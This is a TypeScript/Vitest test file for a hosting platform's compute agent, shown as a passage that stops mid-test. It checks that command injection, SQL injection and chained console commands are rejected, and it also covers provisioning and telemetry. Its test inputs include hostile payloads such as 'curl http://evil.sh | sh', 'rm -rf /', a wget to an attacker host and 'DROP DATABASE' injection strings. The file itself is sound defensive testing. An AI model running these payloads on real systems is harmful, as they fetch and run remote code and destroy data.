import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { NextRequest } from 'next/server';
import { readFileSync, mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import { Readable } from 'node:stream';
import type { IncomingMessage, ServerResponse } from 'node:http';
import {
  containerNameFor,
  renderDockerfile,
  buildDockerRunArgs,
  buildPostgresProvisionPayload,
  buildMysqlProvisionPayload,
  validateTypedAgentCommand,
  createAgentHandler,
} from '../../devhost-agent/server.mjs';

type MockRow = Record<string, unknown>;

interface MockDbState {
  profiles: MockRow[];
  hosting_services: MockRow[];
  hosting_project_settings: MockRow[];
  project_deployments: MockRow[];
  project_env_variables: MockRow[];
  hosting_databases: MockRow[];
  hosting_cron_jobs: MockRow[];
  terminal_and_sql_logs: MockRow[];
  service_uptime_telemetry: MockRow[];
  platform_service_telemetry: MockRow[];
  compute_build_jobs: MockRow[];
  whm_server_nodes: MockRow[];
  catalog_hosting_plans: MockRow[];
  catalog_marketplace_stacks: MockRow[];
  domains: MockRow[];
  domain_dns_records: MockRow[];
  hosting_addon_domains: MockRow[];
  invoices: MockRow[];
  financial_profit_ledger: MockRow[];
  security_audit_logs: MockRow[];
  fraud_alerts: MockRow[];
  diagnostic_scans: MockRow[];
}

const USER_ID = '11111111-1111-4111-8111-111111111111';
const ADMIN_ID = '44444444-4444-4444-8444-444444444444';
const SERVICE_ID = 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb';
const NODE_ID = 'cccccccc-cccc-4ccc-8ccc-cccccccccccc';

function createInitialDb(): MockDbState {
  return {
    profiles: [
      { id: USER_ID, email: 'client@devhost.cloud', full_name: 'Demo Dev', role: 'client', wallet_balance_bdt: 5000 },
      { id: ADMIN_ID, email: 'founder@devhost.cloud', full_name: 'Founder Admin', role: 'admin', wallet_balance_bdt: 10000 },
    ],
    hosting_services: [
      {
        id: SERVICE_ID,
        user_id: USER_ID,
        domain: 'phase7app.devhost.cloud',
        plan_id: 'developer-pro',
        plan_name: 'Developer Pro',
        cpanel_username: 'p7tenant',
        server_node: 'sg1',
        ip_address: '103.151.102.45',
        status: 'active',
        ram_limit_mb: 2048,
        ram_used_mb: 0,
        cpu_cores: 2,
        disk_limit_gb: 5,
        disk_used_gb: 0,
        inode_limit: 300000,
        inode_used: 0,
        bandwidth_limit_gb: 1000,
        bandwidth_used_gb: 0,
      },
    ],
    hosting_project_settings: [
      {
        service_id: SERVICE_ID,
        stack_slug: 'nextjs-15-standalone',
        git_repo_url: 'https://github.com/devhost-templates/nextjs-15-standalone.git',
        git_branch: 'main',
      },
    ],
    project_deployments: [],
    project_env_variables: [],
    hosting_databases: [],
    hosting_cron_jobs: [],
    terminal_and_sql_logs: [],
    service_uptime_telemetry: [],
    platform_service_telemetry: [],
    compute_build_jobs: [],
    whm_server_nodes: [
      {
        id: NODE_ID,
        node_code: 'sg1',
        node_name: 'Singapore Equinix SG1',
        ipv4_address: '103.151.102.45',
        whm_hostname: 'sg1-whm.devhost.cloud',
        whm_username: 'reseller_sg1',
        agent_endpoint: 'https://agent-sg1.devhost.cloud',
        node_driver: 'hybrid',
        primary_nameserver: 'ns1.devhost.cloud',
        secondary_nameserver: 'ns2.devhost.cloud',
        max_cpanel_slots: 200,
        used_cpanel_slots: 12,
        max_disk_gb: 2000,
        allocated_disk_gb: 120,
        auto_provision_enabled: true,
        is_healthy: true,
        is_active: true,
      },
    ],
    catalog_hosting_plans: [
      {
        id: 1,
        slug: 'starter',
        name_en: 'Starter Pack',
        selling_price_monthly_bdt: 200,
        storage_gb: 2,
        ram_mb: 1024,
        cpu_cores: 1,
        inode_limit: 150000,
        whm_package_name: 'devhost_starter_2g',
      },
      {
        id: 2,
        slug: 'developer-pro',
        name_en: 'Developer Pro',
        selling_price_monthly_bdt: 450,
        storage_gb: 5,
        ram_mb: 2048,
        cpu_cores: 2,
        inode_limit: 300000,
        whm_package_name: 'devhost_devpro_5g',
      },
      {
        id: 3,
        slug: 'business-max',
        name_en: 'Business Max',
        selling_price_monthly_bdt: 999,
        storage_gb: 10,
        ram_mb: 4096,
        cpu_cores: 2,
        inode_limit: 600000,
        whm_package_name: 'devhost_bizmax_10g',
      },
    ],
    catalog_marketplace_stacks: [],
    domains: [],
    domain_dns_records: [],
    hosting_addon_domains: [],
    invoices: [],
    financial_profit_ledger: [],
    security_audit_logs: [],
    fraud_alerts: [],
    diagnostic_scans: [],
  };
}

const mockStore = {
  supabaseConfigured: true,
  isAdmin: false,
  actorUser: { id: USER_ID, email: 'client@devhost.cloud', role: 'client' },
  state: createInitialDb(),
};

interface QueryResult {
  data: MockRow | MockRow[] | null;
  error: { message: string } | null;
  count?: number;
}

interface MockQueryChain {
  select: (cols?: string, opts?: { count?: string; head?: boolean }) => MockQueryChain;
  insert: (payload: MockRow | MockRow[]) => MockQueryChain;
  upsert: (payload: MockRow | MockRow[], opts?: { onConflict?: string }) => MockQueryChain;
  update: (patch: MockRow) => MockQueryChain;
  delete: () => MockQueryChain;
  eq: (col: string, val: unknown) => MockQueryChain;
  neq: (col: string, val: unknown) => MockQueryChain;
  gte: (col: string, val: unknown) => MockQueryChain;
  in: (col: string, vals: unknown[]) => MockQueryChain;
  order: () => MockQueryChain;
  limit: () => MockQueryChain;
  single: () => Promise<QueryResult>;
  maybeSingle: () => Promise<QueryResult>;
  then: <TResult1 = QueryResult, TResult2 = never>(
    onfulfilled?: ((value: QueryResult) => TResult1 | PromiseLike<TResult1>) | null,
    onrejected?: ((reason: unknown) => TResult2 | PromiseLike<TResult2>) | null
  ) => Promise<TResult1 | TResult2>;
}

function createQueryBuilder(table: string): MockQueryChain {
  let op: 'select' | 'insert' | 'upsert' | 'update' | 'delete' = 'select';
  let writePayload: MockRow | MockRow[] | null = null;
  let onConflictCol = 'id';
  let headOnly = false;
  const predicates: Array<(r: MockRow) => boolean> = [];

  const getRows = (): MockRow[] => {
    const key = table as keyof MockDbState;
    if (!mockStore.state[key]) mockStore.state[key] = [];
    return mockStore.state[key];
  };

  const execute = (): QueryResult => {
    const rows = getRows();
    const matched = rows.filter((r) => predicates.every((fn) => fn(r)));

    if (op === 'select') {
      return {
        data: headOnly ? null : matched,
        count: matched.length,
        error: null,
      };
    }

    if (op === 'insert' && writePayload) {
      const items = Array.isArray(writePayload) ? writePayload : [writePayload];
      const inserted = items.map((item, idx) => ({
        id: item.id || `${table}_${Date.now()}_${idx}`,
        ...item,
      }));
      rows.push(...inserted);
      return { data: inserted, error: null };
    }

    if (op === 'upsert' && writePayload) {
      const items = Array.isArray(writePayload) ? writePayload : [writePayload];
      const conflictCols = onConflictCol.split(',').map((c) => c.trim());
      const out: MockRow[] = [];
      for (const item of items) {
        const existingIdx = rows.findIndex((r) =>
          conflictCols.every((c) => r[c] !== undefined && r[c] === item[c])
        );
        if (existingIdx >= 0) {
          rows[existingIdx] = { ...rows[existingIdx], ...item };
          out.push(rows[existingIdx]);
        } else {
          const row = { id: item.id || `${table}_${Date.now()}`, ...item };
          rows.push(row);
          out.push(row);
        }
      }
      return { data: out, error: null };
    }

    if (op === 'update' && writePayload) {
      const cleanPatch: MockRow = {};
      for (const [k, v] of Object.entries(writePayload as MockRow)) {
        if (v !== undefined) cleanPatch[k] = v;
      }
      const updated: MockRow[] = [];
      for (let i = 0; i < rows.length; i += 1) {
        if (predicates.every((fn) => fn(rows[i]))) {
          rows[i] = { ...rows[i], ...cleanPatch };
          updated.push(rows[i]);
        }
      }
      return { data: updated, error: null };
    }

    if (op === 'delete') {
      const kept = rows.filter((r) => !predicates.every((fn) => fn(r)));
      mockStore.state[table as keyof MockDbState] = kept;
      return { data: matched, error: null };
    }

    return { data: null, error: null };
  };

  const chain: MockQueryChain = {
    select: (_cols?: string, opts?: { count?: string; head?: boolean }) => {
      headOnly = Boolean(opts?.head);
      return chain;
    },
    insert: (payload: MockRow | MockRow[]) => {
      op = 'insert';
      writePayload = payload;
      return chain;
    },
    upsert: (payload: MockRow | MockRow[], opts?: { onConflict?: string }) => {
      op = 'upsert';
      writePayload = payload;
      onConflictCol = opts?.onConflict || 'id';
      return chain;
    },
    update: (patch: MockRow) => {
      op = 'update';
      writePayload = patch;
      return chain;
    },
    delete: () => {
      op = 'delete';
      return chain;
    },
    eq: (col: string, val: unknown) => {
      predicates.push((r) => r[col] === val);
      return chain;
    },
    neq: (col: string, val: unknown) => {
      predicates.push((r) => r[col] !== val);
      return chain;
    },
    gte: (col: string, val: unknown) => {
      predicates.push((r) => String(r[col] || '') >= String(val));
      return chain;
    },
    in: (col: string, vals: unknown[]) => {
      predicates.push((r) => vals.includes(r[col]));
      return chain;
    },
    order: () => chain,
    limit: () => chain,
    single: async () => {
      const res = execute();
      const first = Array.isArray(res.data) ? res.data[0] || null : res.data;
      return { data: first, error: first ? null : res.error };
    },
    maybeSingle: async () => {
      const res = execute();
      const first = Array.isArray(res.data) ? res.data[0] || null : res.data;
      return { data: first, error: res.error };
    },
    then: <TResult1 = QueryResult, TResult2 = never>(
      onfulfilled?: ((value: QueryResult) => TResult1 | PromiseLike<TResult1>) | null,
      onrejected?: ((reason: unknown) => TResult2 | PromiseLike<TResult2>) | null
    ) => Promise.resolve(execute()).then(onfulfilled, onrejected),
  };

  return chain;
}

vi.mock('@/lib/supabase', () => ({
  isSupabaseConfigured: () => mockStore.supabaseConfigured,
  isDevSandboxMode: () => process.env.DEV_SANDBOX_MODE === 'true',
  getServiceSupabase: () =>
    mockStore.supabaseConfigured ? { from: (t: string) => createQueryBuilder(t) } : null,
  supabase: null,
}));

vi.mock('@/lib/authGuard', async () => {
  const actual = await vi.importActual<typeof import('@/lib/authGuard')>('@/lib/authGuard');
  return {
    ...actual,
    requireUser: vi.fn(async () => ({ ok: true, user: mockStore.actorUser })),
    requireAdmin: vi.fn(async () => ({
      ok: true,
      user: { ...mockStore.actorUser, role: 'admin' },
    })),
    requireServiceAccess: vi.fn(async (_req: unknown, serviceId?: string | null) => ({
      ok: true,
      user: mockStore.actorUser,
      serviceId: serviceId || SERVICE_ID,
    })),
  };
});

async function invokeAgent(
  handler: ReturnType<typeof createAgentHandler>,
  opts: { method: string; path: string; body?: unknown; secret: string }
): Promise<{ status: number; json: Record<string, unknown> }> {
  const rawBody = opts.body !== undefined ? JSON.stringify(opts.body) : '';
  const ts = String(Date.now());
  const sig = crypto.createHmac('sha256', opts.secret).update(`${ts}.${rawBody}`).digest('hex');

  const req = Readable.from([Buffer.from(rawBody)]) as unknown as IncomingMessage;
  req.method = opts.method;
  req.url = opts.path;
  req.headers = {
    host: 'agent-local',
    'content-type': 'application/json',
    'x-devhost-timestamp': ts,
    'x-devhost-signature': `sha256=${sig}`,
    'x-devhost-nonce': crypto.randomUUID(),
  };

  return new Promise((resolve) => {
    let statusCode = 200;
    const chunks: Buffer[] = [];
    const res = {
      writeHead: (code: number) => {
        statusCode = code;
        return res;
      },
      end: (chunk?: unknown) => {
        if (chunk) {
          chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk)));
        }
        const txt = Buffer.concat(chunks).toString('utf8');
        resolve({ status: statusCode, json: txt ? JSON.parse(txt) : {} });
      },
    } as unknown as ServerResponse;

    void handler(req, res);
  });
}

const originalFetch = globalThis.fetch;

describe('Phase 7: Hardened Compute Agent, Reseller WHM Sync & Real Usage Telemetry', () => {
  let tempWorkRoot = '';

  beforeEach(() => {
    mockStore.supabaseConfigured = true;
    mockStore.actorUser = { id: USER_ID, email: 'client@devhost.cloud', role: 'client' };
    mockStore.state = createInitialDb();
    tempWorkRoot = mkdtempSync(join(os.tmpdir(), 'devhost-phase7-'));

    delete process.env.DEV_SANDBOX_MODE;
    delete process.env.WHM_HOST;
    delete process.env.WHM_USERNAME;
    delete process.env.WHM_API_TOKEN;
    delete process.env.COMPUTE_AGENT_URL;
    delete process.env.DEVHOST_COMPUTE_AGENT_SECRET;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
    if (tempWorkRoot) {
      rmSync(tempWorkRoot, { recursive: true, force: true });
    }
    vi.restoreAllMocks();
  });

  it('1. Blocks Dockerfile command injection across documentRoot, startupFile, installCommand, and buildCommand', () => {
    expect(() =>
      renderDockerfile({
        runtimeFamily: 'php_litespeed',
        documentRoot: '/public; curl http://evil.sh | sh',
        upstreamPort: 8080,
      })
    ).toThrow(/Unsafe or invalid documentRoot/);

    expect(() =>
      renderDockerfile({
        runtimeFamily: 'nodejs',
        startupFile: 'server.js; rm -rf /',
        upstreamPort: 3000,
      })
    ).toThrow(/Unsafe startupFile/);

    expect(() =>
      renderDockerfile({
        runtimeFamily: 'nodejs',
        installCommand: 'npm ci && wget http://attacker/payload',
        upstreamPort: 3000,
      })
    ).toThrow(/shell metacharacters/);

    expect(() =>
      renderDockerfile({
        runtimeFamily: 'nodejs',
        buildCommand: 'bash -c id',
        upstreamPort: 3000,
      })
    ).toThrow(/not in the build allowlist/);

    expect(() =>
      renderDockerfile({
        runtimeFamily: 'nodejs',
        buildCommand: 'bash -c "id"',
        upstreamPort: 3000,
      })
    ).toThrow(/shell metacharacters/);

    expect(() =>
      renderDockerfile({
        runtimeFamily: 'python',
        startupFile: 'main:app;id',
        upstreamPort: 8000,
      })
    ).toThrow(/Unsafe startupFile/);

    const safeNodeDockerfile = renderDockerfile({
      runtimeFamily: 'nodejs',
      installCommand: 'npm ci',
      buildCommand: 'npm run build',
      startupFile: 'server.js',
      upstreamPort: 3000,
    });
    expect(safeNodeDockerfile).toContain('USER 10001:10001');
    expect(safeNodeDockerfile).toContain('CMD ["node","server.js"]');
    expect(safeNodeDockerfile).toContain('RUN ["npm","ci"]');
    expect(safeNodeDockerfile).not.toContain('sh -c');

    const runArgs = buildDockerRunArgs({
      containerId: containerNameFor('p7tenant', SERVICE_ID),
      ramLimitMb: 2048,
      cpuCores: 2,
      hostPort: 31234,
      upstreamPort: 3000,
      serviceId: SERVICE_ID,
      cpanelUser: 'p7tenant',
      imageTag: 'devhost/app:rel1',
    });
    expect(runArgs).toContain('--cap-drop=ALL');
    expect(runArgs).toContain('--security-opt=no-new-privileges:true');
    expect(runArgs).toContain('--pids-limit=256');
    expect(runArgs).toContain('--user');
    expect(runArgs).toContain('10001:10001');
    expect(runArgs).toContain('--read-only');
  });

  it('2. Unifies containerNameFor across provision, ssh, telemetry, scale & lifecycle and removes 200 ok:true stub', async () => {
    const recordedExecs: Array<{ cmd: string; args: string[]; env?: Record<string, string>; stdin?: string }> = [];
    const expectedContainer = containerNameFor('p7tenant', SERVICE_ID);
    expect(expectedContainer).toBe('dh_p7tenant_bbbbbbbb');

    // Create real workspace files to verify genuine telemetry size + inode measurement
    const serviceWorkDir = join(tempWorkRoot, 'p7tenant', SERVICE_ID.toLowerCase());
    mkdirSync(join(serviceWorkDir, 'public_html'), { recursive: true });
    writeFileSync(join(serviceWorkDir, 'public_html', 'index.js'), 'console.log("hello");'.repeat(100));
    writeFileSync(join(serviceWorkDir, 'public_html', 'style.css'), 'body{margin:0}'.repeat(50));

    const handler = createAgentHandler({
      agentSecret: 'super_secret_agent_key_123456',
      workRoot: tempWorkRoot,
      backupRoot: join(tempWorkRoot, 'backups'),
      runExecFile: async (cmd: string, args: string[], opts?: { env?: Record<string, string>; stdin?: string }) => {
        recordedExecs.push({ cmd, args, env: opts?.env, stdin: opts?.stdin });
        if (cmd === 'docker' && args[0] === 'stats') {
          return {
            ok: true,
            code: 0,
            stdout: JSON.stringify({ CPUPerc: '4.25%', MemUsage: '184.5MiB / 2GiB' }),
            stderr: '',
          };
        }
        if (cmd === 'docker' && args[0] === 'inspect') {
          return {
            ok: true,
            code: 0,
            stdout: `running|${new Date(Date.now() - 45000).toISOString()}`,
            stderr: '',
          };
        }
        return { ok: true, code: 0, stdout: 'ok', stderr: '' };
      },
    });

    const secret = 'super_secret_agent_key_123456';

    // Real container telemetry should use unified container name and actual disk/inode count
    const telRes = await invokeAgent(handler, {
      method: 'GET',
      path: `/v1/telemetry/${SERVICE_ID}?cpanelUser=p7tenant&domain=phase7app.devhost.cloud`,
      secret,
    });
    expect(telRes.status).toBe(200);
    expect(telRes.json.containerId).toBe(expectedContainer);
    expect(telRes.json.cpuPercent).toBe(4.25);
    expect(telRes.json.ramUsedMb).toBe(185);
    expect(Number(telRes.json.inodesUsed)).toBeGreaterThanOrEqual(3); // public_html dir + 2 files
    expect(Number(telRes.json.inodesUsed)).not.toBe(3200);
    expect(Number(telRes.json.diskUsedGb)).toBeGreaterThanOrEqual(0);

    // SSH uses exact unified container name + non-root user + no sh -c
    const sshRes = await invokeAgent(handler, {
      method: 'POST',
      path: '/v1/console/ssh',
      body: { serviceId: SERVICE_ID, cpanelUser: 'p7tenant', command: 'ls -la' },
      secret,
    });
    expect(sshRes.status).toBe(200);
    const sshExec = recordedExecs.find((e) => e.cmd === 'docker' && e.args[0] === 'exec');
    expect(sshExec?.args).toEqual(['exec', '--user', '10001:10001', '-w', '/app', expectedContainer, 'ls', '-la']);

    // Disallowed SSH injection command blocked directly on agent
    const blockedSsh = await invokeAgent(handler, {
      method: 'POST',
      path: '/v1/console/ssh',
      body: { serviceId: SERVICE_ID, cpanelUser: 'p7tenant', command: 'ls; id' },
      secret,
    });
    expect(blockedSsh.status).toBe(400);

    // Scale + lifecycle use exact same containerNameFor
    const scaleRes = await invokeAgent(handler, {
      method: 'POST',
      path: '/v1/containers/scale',
      body: { serviceId: SERVICE_ID, cpanelUser: 'p7tenant', ramLimitMb: 4096, cpuCores: 4 },
      secret,
    });
    expect(scaleRes.status).toBe(200);
    expect(scaleRes.json.containerId).toBe(expectedContainer);

    const lifeRes = await invokeAgent(handler, {
      method: 'POST',
      path: '/v1/containers/lifecycle',
      body: { serviceId: SERVICE_ID, cpanelUser: 'p7tenant', action: 'restart' },
      secret,
    });
    expect(lifeRes.status).toBe(200);
    expect(lifeRes.json.containerId).toBe(expectedContainer);

    // Unknown /v1/* route must return 501 (not 200 ok:true stub) & unknown root returns 404
    const unimplRes = await invokeAgent(handler, {
      method: 'POST',
      path: '/v1/nonexistent/endpoint',
      body: {},
      secret,
    });
    expect(unimplRes.status).toBe(501);
    expect(unimplRes.json.ok).toBe(false);

    const notFoundRes = await invokeAgent(handler, {
      method: 'GET',
      path: '/random-path',
      secret,
    });
    expect(notFoundRes.status).toBe(404);
  });

  it('3. Fails Docker build atomically (502 + failed callback) and parameterizes Postgres/MySQL DB credentials', async () => {
    const callbacks: Array<Record<string, unknown>> = [];
    const secret = 'super_secret_agent_key_123456';

    const failingHandler = createAgentHandler({
      agentSecret: secret,
      workRoot: tempWorkRoot,
      allowWorkspaceOnly: false,
      runExecFile: async (cmd: string, args: string[]) => {
        if (cmd === 'docker' && args[0] === 'build') {
          return { ok: false, code: 1, stdout: '', stderr: 'SyntaxError during container build' };
        }
        return { ok: true, code: 0, stdout: 'ok', stderr: '' };
      },
      fetchImpl: (async (_url: string, init?: { body?: string }) => {
        if (init?.body) callbacks.push(JSON.parse(init.body));
        return new Response(JSON.stringify({ ok: true }), { status: 200 });
      }) as typeof fetch,
    });

    const provRes = await invokeAgent(failingHandler, {
      method: 'POST',
      path: '/v1/containers/provision',
      body: {
        serviceId: SERVICE_ID,
        cpanelUser: 'p7tenant',
        domain: 'fail.devhost.cloud',
        runtimeFamily: 'nodejs',
        releaseId: 'rel_fail_1',
        callbackUrl: 'https://panel.devhost.cloud/api/compute/agent-callback',
      },
      secret,
    });
    expect(provRes.status).toBe(502);
    expect(provRes.json.ok).toBe(false);
    expect(callbacks).toHaveLength(1);
    expect(callbacks[0].status).toBe('failed');

    // SQL injection character-laden password must never interpolate unescaped into SQL statements
    const evilPass = "P@ss'; DROP DATABASE postgres; -- \\'\"";
    const pgPayload = buildPostgresProvisionPayload({
      dbName: 'app_prod',
      dbUser: 'app_user',
      password: evilPass,
      adminPass: 'admin_pg_secret',
    });
    expect(pgPayload.args).toContain(`dbpass=${evilPass}`);
    expect(pgPayload.stdin).not.toContain('DROP DATABASE');
    expect(pgPayload.stdin).toContain("format('CREATE ROLE %I WITH LOGIN PASSWORD %L'");
    expect(pgPayload.env.PGPASSWORD).toBe('admin_pg_secret');

    const mysqlPayload = buildMysqlProvisionPayload({
      dbName: 'app_prod',
      dbUser: 'app_user',
      password: evilPass,
      host: '127.0.0.1',
      adminPass: 'admin_mysql_secret',
    });
    expect(mysqlPayload.args.join(' ')).not.toContain('admin_mysql_secret');
    expect(mysqlPayload.env.MYSQL_PWD).toBe('admin_mysql_secret');
    expect(mysqlPayload.stdin).toContain('UNHEX(');
    expect(mysqlPayload.stdin).toContain('NO_BACKSLASH_ESCAPES');
    expect(mysqlPayload.stdin).not.toContain('DROP DATABASE');
  });

  it('4. Resolves real Starter/BusinessMax plan quotas in ZeroTouchProvisioner & fails atomically on WHM or Agent errors', async () => {
    const { executeZeroTouchProvisioning } = await import('@/lib/zeroTouchProvisioner');

    // Scenario A: Starter pack + live WHM getpkginfo + createacct success
    process.env.WHM_HOST = 'sg1-whm.devhost.cloud';
    process.env.WHM_USERNAME = 'root';
    process.env.WHM_API_TOKEN = 'whm_live_token_abc123456';

    globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = String(input);
      if (url.includes('getpkginfo')) {
        return new Response(
          JSON.stringify({
            metadata: { result: 1 },
            data: { pkg: { QUOTA: '2048M', BWLIMIT: '512000M', lve_pmem: '1024M', lve_cpu: 100, lve_inodes: 150000 } },
          }),
          { status: 200 }
        );
      }
      if (url.includes('createacct')) {
        return new Response(
          JSON.stringify({ metadata: { result: 1, reason: 'Account Created' }, data: { ip: '103.151.102.45' } }),
          { status: 200 }
        );
      }
      return new Response(JSON.stringify({ success: true }), { status: 200 });
    }) as typeof fetch;

    const okStarter = await executeZeroTouchProvisioning({
      userId: USER_ID,
      customerEmail: 'starter@devhost.cloud',
      domain: 'starter-site.com',
      planId: 'starter',
      planName: 'Starter Pack',
      gateway: 'bkash',
      amountBDT: 200,
      skipInvoiceMarkPaid: true,
    });
    expect(okStarter.success).toBe(true);
    const starterSrv = mockStore.state.hosting_services.find((s) => s.domain === 'starter-site.com');
    expect(starterSrv?.status).toBe('active');
    expect(starterSrv?.disk_limit_gb).toBe(2);
    expect(starterSrv?.ram_limit_mb).toBe(1024);
    expect(starterSrv?.inode_limit).toBe(150000);
    expect(starterSrv?.disk_used_gb).toBe(0);
    expect(starterSrv?.ram_used_mb).toBe(0);
    expect(starterSrv?.inode_used).toBe(0);

    // Scenario B: WHM createacct failure -> must NOT mark active, must rollback node counters & record provisioning_failed
    globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = String(input);
      if (url.includes('getpkginfo')) {
        return new Response(JSON.stringify({ metadata: { result: 0 } }), { status: 200 });
      }
      if (url.includes('createacct')) {
        return new Response(
          JSON.stringify({ metadata: { result: 0, reason: 'Quota exceeded on reseller WHM' } }),
          { status: 200 }
        );
      }
      return new Response(JSON.stringify({}), { status: 200 });
    }) as typeof fetch;

    const prevSlots = Number(mockStore.state.whm_server_nodes[0].used_cpanel_slots);
    const failWhm = await executeZeroTouchProvisioning({
      userId: USER_ID,
      customerEmail: 'fail@devhost.cloud',
      domain: 'whm-fail-site.com',
      planId: 'business-max',
      planName: 'Business Max',
      gateway: 'bkash',
      amountBDT: 999,
      skipInvoiceMarkPaid: true,
    });
    expect(failWhm.success).toBe(false);
    expect(failWhm.error).toContain('Quota exceeded');

    const failedSrv = mockStore.state.hosting_services.find((s) => s.domain === 'whm-fail-site.com');
    expect(failedSrv?.status).toBe('provisioning_failed');
    expect(failedSrv?.disk_limit_gb).toBe(10);
    expect(failedSrv?.ram_limit_mb).toBe(4096);
    expect(failedSrv?.inode_limit).toBe(600000);
    expect(mockStore.state.whm_server_nodes[0].used_cpanel_slots).toBe(prevSlots);
  });

  it('5. Syncs WHM accountsummary + container telemetry into hosting_services via /api/compute and enforces strict console firewall', async () => {
    process.env.WHM_HOST = 'sg1-whm.devhost.cloud';
    process.env.WHM_USERNAME = 'root';
    process.env.WHM_API_TOKEN = 'whm_live_token_abc123456';
    process.env.COMPUTE_AGENT_URL = 'https://agent-sg1.devhost.cloud';
    process.env.DEVHOST_COMPUTE_AGENT_SECRET = 'phase7_compute_secret_1234';

    globalThis.fetch = vi.fn(async (input: RequestInfo | URL) => {
      const url = String(input);
      if (url.includes('accountsummary')) {
        return new Response(
          JSON.stringify({
            metadata: { result: 1 },
            data: {
              acct: [
                {
                  user: 'p7tenant',
                  domain: 'phase7app.devhost.cloud',
                  diskused: '1536M',
                  disklimit: '5120M',
                  inodesused: 48210,
                  inodeslimit: 300000,
                  bwused: '10240M',
                  bwlimit: '1024000M',
                  suspended: 0,
                },
              ],
            },
          }),
          { status: 200 }
        );
      }
      if (url.includes('/v1/telemetry/')) {
        return new Response(
          JSON.stringify({
            serviceId: SERVICE_ID,
            domain: 'phase7app.devhost.cloud',
            containerId: 'dh_p7tenant_bbbbbbbb',
            status: 'running',
            cpuPercent: 18.4,
            ramUsedMb: 640,
            ramLimitMb: 2048,
            diskUsedGb: 1.5,
            inodesUsed: 48210,
            httpStatus: 200,
            uptimeSeconds: 7200,
            logs: 'ready',
            checkedAt: new Date().toISOString(),
          }),
          { status: 200 }
        );
      }
      return new Response(JSON.stringify({ ok: true }), { status: 200 });
    }) as typeof fetch;

    const { GET: computeGet } = await import('@/app/api/compute/route');
    const cRes = await computeGet(new NextRequest(`http://localhost/api/compute?serviceId=${SERVICE_ID}`));
    expect(cRes.status).toBe(200);
    const cJson = (await cRes.json()) as {
      telemetry: { cpuPercent: number; diskUsedGb: number; inodesUsed: number };
      whmSummary: { diskUsedGb: number; bandwidthUsedGb: number };
    };
    expect(cJson.telemetry.diskUsedGb).toBe(1.5);
    expect(cJson.telemetry.inodesUsed).toBe(48210);
    expect(cJson.whmSummary.bandwidthUsedGb).toBe(10);

    // Persisted back into hosting_services & service_uptime_telemetry
    const srv = mockStore.state.hosting_services[0];
    expect(srv.disk_used_gb).toBe(1.5);
    expect(srv.inode_used).toBe(48210);
    expect(srv.ram_used_mb).toBe(640);
    expect(srv.bandwidth_used_gb).toBe(10);
    expect(mockStore.state.service_uptime_telemetry.length).toBeGreaterThanOrEqual(1);

    // Strict console command schema validation
    const { POST: consolePost } = await import('@/app/api/hosting/console/route');
    const chainedSsh = await consolePost(
      new NextRequest('http://localhost/api/hosting/console', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          serviceId: SERVICE_ID,
          consoleType: 'jailed_ssh',
          commandOrQuery: 'ls -la; whoami',
        }),
      })
    );
    expect(chainedSsh.status).toBe(403);

    const evalSsh = await consolePost(
      new NextRequest('http://localhost/api/hosting/console', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          serviceId: SERVICE_ID,
          consoleType: 'jailed_ssh',
          commandOrQuery: 'node -e "process.exit(1)"',
        }),
      })
    );
    expect(evalSsh.status).toBe(403);

    const stackedSql = await consolePost(
      new NextRequest('http://localhost/api/hosting/console', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          serviceId: SERVICE_ID,
          consoleType: 'sql_runner',
          commandOrQuery: 'SELECT * FROM orders; DROP TABLE users;',
        }),
      })
    );
    expect(stackedSql.status).toBe(403);
  });

  it('6. Computes real persisted SLA telemetry in /api/uptime & selfHealingEngine and removes 38400/420 fallbacks', async () => {
    const { GET: uptimeGet, POST: uptimePost } = await import('@/app/api/uptime/route');
    const { aggregate30DayUptimeBars } = await import('@/lib/selfHealingEngine');
    const { GET: logDoctorGet } = await import('@/app/api/hosting/log-doctor/route');

    // Empty telemetry returns honest monitoring_syncing status (no fake random history)
    const emptyRes = await uptimeGet();
    expect(emptyRes.status).toBe(200);
    const emptyJson = (await emptyRes.json()) as {
      status: string;
      overallUptime90d: string;
      services: Array<{ currentStatus: string; uptime90d: string }>;
    };
    expect(emptyJson.status).toBe('monitoring_syncing');
    expect(emptyJson.overallUptime90d).toBe('Syncing...');
    expect(emptyJson.services.every((s) => s.currentStatus === 'unprobed')).toBe(true);

    // Record live probes via POST /api/uptime and verify GET aggregates genuine SLA data
    const probePostRes = await uptimePost(
      new NextRequest('http://localhost/api/uptime', { method: 'POST' })
    );
    expect(probePostRes.status).toBe(200);
    expect(mockStore.state.platform_service_telemetry.length).toBe(5);
    expect(typeof mockStore.state.platform_service_telemetry[0].service_name).toBe('string');
    expect(String(mockStore.state.platform_service_telemetry[0].service_name).length).toBeGreaterThan(0);
    expect(String(mockStore.state.platform_service_telemetry[0].category).length).toBeGreaterThan(0);

    const populatedRes = await uptimeGet();
    const populatedJson = (await populatedRes.json()) as {
      telemetryBacked: boolean;
      overallUptime90d: string;
      services: Array<{ id: string; numericUptime: number | null }>;
    };
    expect(populatedJson.telemetryBacked).toBe(true);
    expect(populatedJson.overallUptime90d).toMatch(/%$/);

    // Verify real telemetry aggregation in selfHealingEngine
    const today = new Date().toISOString();
    const bars = aggregate30DayUptimeBars([
      { checked_at: today, http_status: 200, incident_type: 'healthy' },
      { checked_at: today, http_status: 503, incident_type: 'http_503_passenger_hang' },
    ]);
    expect(bars).toHaveLength(30);
    expect(bars[29].uptimePercent).toBe(50);
    expect(bars[29].status).toBe('down');
    expect(bars[0].status).toBe('no_data');

    // Verify log-doctor does NOT fall back to hardcoded 38400 / 420
    const docRes = await logDoctorGet(
      new NextRequest(`http://localhost/api/hosting/log-doctor?serviceId=${SERVICE_ID}`)
    );
    expect(docRes.status).toBe(200);
    const docJson = (await docRes.json()) as {
      metricsSummary: { inodesUsed: number; ramUsedMB: number };
    };
    expect(docJson.metricsSummary.inodesUsed).toBe(0);
